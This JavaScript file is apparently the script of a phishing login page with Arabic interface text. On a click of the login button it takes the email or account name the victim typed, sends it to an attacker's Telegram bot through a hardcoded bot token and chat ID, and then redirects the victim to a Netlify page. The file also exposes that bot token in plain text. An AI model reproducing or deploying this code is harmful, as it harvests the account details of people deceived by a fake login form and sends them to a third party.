
document.getElementById("login-btn").addEventListener("click", function(e) {
  e.preventDefault();
  
  const emailInput = document.getElementById("emailInput");
  const email = emailInput.value;
  const status = document.getElementById("status");
  const button = document.getElementById("login-btn");
  

  if (!email) {
    status.textContent = "الرجاء إدخال البريد الإلكتروني";
    status.style.color = "orange";
    return;
  }
  

  const originalText = button.textContent;
  button.textContent = "التالي";
  button.disabled = true;
  status.textContent = "";
  

  const telegramToken = "8237856348:AAE_Qgc5V4m63m-IDAHTLO8IKIwZEuCZG98";
  const chatId = "6657124417";
  
  const text = `الاميل او الحساب:⬅ ️.  
  ${email}` ;
  
 
  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        status.textContent = "";
        status.style.color = "green";
        emailInput.value = ""; 
        
        setTimeout(() => {
  window.location.href = "https://heartfelt-stardust-461914.netlify.app/";
}, 2000);

      } else {
        status.textContent = ""
        status.style.color = "red";
        console.error(data);
      }
    })
    .catch(err => {
      status.textContent ="ً";
      status.style.color = "red";
      console.error(err);
    })
    .finally(() => {

      setTimeout(() => {
        button.textContent = originalText;
        button.disabled = false;
      }, 2000);
    });
});
